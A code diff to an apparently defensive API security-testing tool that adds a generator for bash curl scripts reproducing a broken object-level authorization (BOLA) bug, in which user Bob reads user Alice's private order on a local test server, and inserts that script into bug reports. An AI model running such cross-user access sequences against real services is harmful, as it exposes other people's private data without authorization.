@@ -435,6 +435,41 @@ def generate_powershell_curl_script(
     return "\n".join(lines)
 
 
+def generate_curl_script(
+    finding: BugFinding,
+    base_url: str = "http://127.0.0.1:8000",
+) -> str:
+    """Generate copy-pasteable bash/POSIX curl commands reproducing the issue."""
+    lines = [
+        "#!/usr/bin/env bash",
+        f"# Target: {finding.method} {finding.endpoint}",
+        "",
+        "# Step 1: Reset test database",
+        f'curl -s -X POST "{base_url}/admin/reset"',
+        "",
+        "# Step 2: Login as Alice to obtain token",
+        f'ALICE_TOKEN=$(curl -s -X POST "{base_url}/auth/login" \\',
+        '  -H "Content-Type: application/json" \\',
+        '  -d \'{"username":"alice","password":"alice123"}\' | grep -o \'"access_token":"[^"]*\' | cut -d\'"\' -f4)',
+        "",
+        "# Step 3: Create private order as Alice",
+        f'ORDER_ID=$(curl -s -X POST "{base_url}/orders" \\',
+        '  -H "Content-Type: application/json" \\',
+        '  -H "Authorization: Bearer $ALICE_TOKEN" \\',
+        '  -d \'{"item_name":"Autonomous Drone","quantity":1,"total_price":299.99}\' | grep -o \'"id":"[^"]*\' | cut -d\'"\' -f4)',
+        "",
+        "# Step 4: Login as Bob to obtain Bob\'s token",
+        f'BOB_TOKEN=$(curl -s -X POST "{base_url}/auth/login" \\',
+        '  -H "Content-Type: application/json" \\',
+        '  -d \'{"username":"bob","password":"bob123"}\' | grep -o \'"access_token":"[^"]*\' | cut -d\'"\' -f4)',
+        "",
+        "# Step 5: Bob accesses Alice\'s order without authorization (BOLA exploit)",
+        f'curl -i -X GET "{base_url}/orders/$ORDER_ID" \\',
+        '  -H "Authorization: Bearer $BOB_TOKEN"',
+    ]
+    return "\n".join(lines)
+
+
 # ------------------------------------------------------------------------------
 # Comprehensive Bug Report Model
 # ------------------------------------------------------------------------------
@@ -463,6 +498,7 @@ class BugReport(BaseModel):
     reduction_percentage: float = Field(default=0.0)
     pruned_requests: List[str] = Field(default_factory=list)
     pruned_payload_fields: List[str] = Field(default_factory=list)
+    curl_reproduction: str = Field(default="")
     powershell_reproduction: str = Field(default="")
     pytest_reproduction: str = Field(default="")
     created_at: str = Field(
@@ -563,13 +599,19 @@ class BugReport(BaseModel):
             "",
             "## 5. Reproduction Instructions",
             "",
-            "### Option A: Windows PowerShell / curl",
+            "### Option A: curl Command Sequence",
+            "",
+            "```bash",
+            self.curl_reproduction,
+            "```",
+            "",
+            "### Option B: Windows PowerShell",
             "",
             "```powershell",
             self.powershell_reproduction,
             "```",
             "",
-            "### Option B: Standalone Pytest Test Suite",
+            "### Option C: Standalone Pytest Test Suite",
             "",
             "Execute independently with: `pytest reports/test_reproduce_bola.py -v`",
             "",
@@ -640,6 +682,7 @@ class BugReporter:
         )
 
         # 2. Generate reproduction scripts
+        curl_script = generate_curl_script(finding, base_url=self.executor.base_url)
         powershell_script = generate_powershell_curl_script(finding, base_url=self.executor.base_url)
         pytest_script = generate_pytest_reproduction(finding, minimization, base_url=self.executor.base_url)
 
@@ -673,6 +716,7 @@ class BugReporter:
             reduction_percentage=reduction_pct,
             pruned_requests=pruned_steps,
             pruned_payload_fields=pruned_fields,
+            curl_reproduction=curl_script,
             powershell_reproduction=powershell_script,
             pytest_reproduction=pytest_script,
         )
